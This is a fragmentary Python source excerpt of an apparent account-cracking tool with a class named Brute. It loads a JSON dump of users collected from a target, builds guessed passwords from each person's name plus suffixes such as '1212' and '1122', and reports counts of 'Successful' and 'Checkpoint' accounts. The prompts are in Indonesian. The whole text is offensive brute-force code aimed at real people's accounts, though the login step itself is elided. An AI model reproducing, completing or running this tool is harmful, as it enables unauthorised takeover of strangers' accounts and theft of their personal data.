...
class Brute:
    ...
    def brute(self, users):
        if self.setpw == False:
            ...
            for pw in users['pw']:
                ...
                sys.stdout.write(('\r\x1b[0;97m [\x1b[0;94m{}\x1b[0;97m] S e Z a R {}/{}\x1b[0;92m Successful \x1b[0;97m:\x1b[0;92m {}\x1b[0;93m Checkpoint \x1b[0;97m:\x1b[0;93m {} ').format(datetime.now().strftime('%H:%M:%S'), self.loop, len(self.target), len(self.ok), len(self.cp)))
                sys.stdout.flush()
    ...
    def main(self):
        while True:
            file = raw_input('\x1b[0;97m [\x1b[0;94m\xe2\x80\xa2\x1b[0;97m] Contoh Dump \x1b[0;91m:\x1b[0;97m [\x1b[0;93m dump/Nawefile.json\x1b[0;97m ]\n [\x1b[0;91m?\x1b[0;97m]\x1b[0;97m Output Dump\x1b[0;91m :\x1b[0;92m ')
            try:
        ...
        for user in object:
            try:
                obj = user['name'].split(' ')
                if len(obj) == 1:
                    listpass = [obj[0] + '1212', obj[0] + '1212',
                     obj[0] + '1122']
                elif len(obj) == 2:
                    listpass = [obj[0] + '1212', obj[0] + '1122',
                     obj[1] + '1212', obj[1] + '1122']
                elif len(obj) == 3:
                    listpass = [obj[0] + '1212', obj[0] + '1122',
                     obj[1] + '1212', obj[1] + '1212',
                     obj[2] + '1212', obj[2] + '1122']
                elif len(obj) == 4:
                    listpass = [obj[0] + '1212', obj[0] + '1122',
                     obj[1] + '1212', obj[1] + '1122',
                     obj[2] + '1212', obj[2] + '1122',
                     obj[3] + '1212', obj[3] + '1122']
                else:
                    listpass = ['112254321']
